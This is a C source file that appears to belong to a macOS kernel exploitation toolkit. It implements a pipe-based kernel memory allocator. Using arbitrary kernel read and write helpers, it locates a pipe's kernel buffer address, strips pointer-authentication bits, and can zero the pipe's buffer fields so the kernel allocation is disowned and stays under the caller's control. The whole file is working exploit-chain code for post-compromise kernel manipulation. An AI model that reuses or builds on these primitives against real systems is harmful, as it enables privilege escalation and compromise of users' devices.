//
//  allocator_pipe.c
//  xe
//
//  Created by admin on 11/22/21.
//

#include <assert.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/errno.h>

#include "allocator/small_mem.h"
#include "xnu/proc.h"
#include "util/ptrauth.h"
#include "memory/kmem.h"
#include "util/assert.h"
#include "util/log.h"

#include <macos/kernel.h>


struct xpl_allocator_small_mem {
    int fd0;
    int fd1;
};

xpl_allocator_small_mem_t xpl_allocator_small_mem_allocate(size_t size, uintptr_t* buffer_ptr_out) {
    xpl_assert_cond(size, <=, 4 * 16384);
    
    int fds[2];
    int res = pipe(fds);
    xpl_assert_errno(res);
    
    uintptr_t proc = xpl_proc_current_proc();
    
    uintptr_t pipe;
    int error = xpl_proc_find_fd_data(proc, fds[0], &pipe);
    xpl_assert_err(error);
    
    char* temp = malloc(size);
    bzero(temp, size);
    
    /// Increase the size of allocated pipe buffer to required size
    ssize_t bytes = write(fds[1], temp, size);
    xpl_assert_cond(bytes, ==, size);
    free(temp);
    
    uintptr_t buffer = xpl_ptrauth_strip(xpl_kmem_read_uint64(pipe, TYPE_PIPEBUF_MEM_BUFFER_OFFSET));
    uint buffer_size = xpl_kmem_read_uint32(pipe, TYPE_PIPEBUF_MEM_SIZE_OFFSET);
    xpl_assert(buffer_size >= size);
    
    xpl_allocator_small_mem_t allocator = (xpl_allocator_small_mem_t)malloc(sizeof(struct xpl_allocator_small_mem));
    allocator->fd0 = fds[0];
    allocator->fd1 = fds[1];
    *buffer_ptr_out = buffer;
    
    return allocator;
}

uintptr_t xpl_allocator_small_allocate_disowned(size_t size) {
    uintptr_t addr;
    xpl_allocator_small_mem_t allocator = xpl_allocator_small_mem_allocate(size, &addr);
    
    uintptr_t pipe;
    int error = xpl_proc_find_fd_data(xpl_proc_current_proc(), allocator->fd0, &pipe);
    xpl_assert_err(error);
    
    xpl_kmem_write_uint64(pipe, TYPE_PIPEBUF_MEM_BUFFER_OFFSET, 0);
    xpl_kmem_write_uint64(pipe, TYPE_PIPEBUF_MEM_SIZE_OFFSET, 0);
    
    xpl_allocator_small_mem_destroy(&allocator);
    return addr;
}

void xpl_allocator_small_mem_destroy(xpl_allocator_small_mem_t* pipe) {
    close((*pipe)->fd0);
    close((*pipe)->fd1);
    free(*pipe);
    *pipe = NULL;
}
